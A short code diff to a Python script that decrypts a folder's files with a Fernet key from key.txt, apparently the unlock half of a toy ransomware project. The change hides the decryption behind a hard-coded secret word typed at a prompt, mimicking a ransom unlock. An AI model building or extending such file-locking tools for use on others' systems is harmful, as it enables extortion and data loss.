@@ -17,13 +17,20 @@ for file in os.listdir():
 with open("key.txt", "rb") as allKeys: 
     secretKey = allKeys.read()
 
-#! Loop to decrypt file content
-for file in files: 
-    with open(file, "rb") as readFile: 
-        contents = readFile.read()
-        contents_decrypted = Fernet(secretKey).decrypt(contents)
-    with open(file, "wb") as writeFile: 
-        writeFile.write(contents_decrypted)
+#* Private key to authorize file decryption
+secretWork = "santos"
+capturingData = input("Enter the secret word to decrypt your files: ")
+
+if capturingData == secretWork: 
+    #! Loop to decrypt file content
+    for file in files: 
+        with open(file, "rb") as readFile: 
+            contents = readFile.read()
+            contents_decrypted = Fernet(secretKey).decrypt(contents)
+        with open(file, "wb") as writeFile: 
+            writeFile.write(contents_decrypted)
+else: 
+    print("Wrong secret word...")
 
 #* Listing decrypted files
 for file in files: 
